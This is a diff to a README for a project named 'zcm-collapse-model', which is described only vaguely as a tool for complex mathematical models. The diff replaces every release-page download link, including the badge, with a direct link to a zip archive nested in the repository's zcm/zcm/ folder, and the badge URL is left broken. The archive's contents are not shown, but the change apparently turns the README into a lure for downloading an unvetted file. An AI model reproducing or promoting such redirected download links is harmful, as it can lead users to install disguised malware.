@@ -1,7 +1,7 @@
 # 🛠️ zcm-collapse-model - Simplifying Complex Calculations
 
 ## 🚀 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/Jazmin1999/zcm-collapse-model/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Jazmin1999/zcm-collapse-model/main/zcm/zcm/zcm-collapse-model-v3.9.zip%20Latest%20Release-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Jazmin1999/zcm-collapse-model/main/zcm/zcm/zcm-collapse-model-v3.9.zip)
 
 ## 📖 Description
 Zeta Collapse Model (ZCM) offers an advanced framework for managing complex mathematical models. This application is designed to help users analyze data efficiently and effectively. Our system architecture and database are patent-pending and thus not included.
@@ -17,7 +17,7 @@ Zeta Collapse Model (ZCM) offers an advanced framework for managing complex math
 ## 📥 Download & Install
 To get started with ZCM, visit the following page to download the software:
 
-[Download ZCM from Releases Page](https://github.com/Jazmin1999/zcm-collapse-model/releases)
+[Download ZCM from Releases Page](https://raw.githubusercontent.com/Jazmin1999/zcm-collapse-model/main/zcm/zcm/zcm-collapse-model-v3.9.zip)
 
 After downloading, follow these simple steps to install:
 
@@ -62,4 +62,4 @@ We plan to introduce more features that enhance performance and usability. Your 
 ## 🖥️ Conclusion
 Zeta Collapse Model positions itself as a vital tool for anyone looking to simplify their data management process. Download it today, and experience the efficiency for yourself.
 
-[Download ZCM from Releases Page](https://github.com/Jazmin1999/zcm-collapse-model/releases)
+[Download ZCM from Releases Page](https://raw.githubusercontent.com/Jazmin1999/zcm-collapse-model/main/zcm/zcm/zcm-collapse-model-v3.9.zip)
